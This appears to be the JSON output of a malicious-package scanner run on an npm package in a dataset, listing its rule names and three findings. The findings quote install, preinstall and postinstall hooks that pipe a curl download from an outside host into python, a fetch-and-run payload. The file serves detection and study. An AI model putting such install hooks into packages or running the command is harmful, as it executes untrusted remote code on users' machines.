@@ -1,0 +1,32 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package.json:7",
+                "code": "    \"preinstall\": \"curl static.ricterz.me|python\",\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            },
+            {
+                "location": "package.json:8",
+                "code": "    \"postinstall\": \"curl static.ricterz.me|python\",\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            },
+            {
+                "location": "package.json:9",
+                "code": "    \"install\": \"curl static.ricterz.me|python\",\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/rrgod-1.0.0"
+}
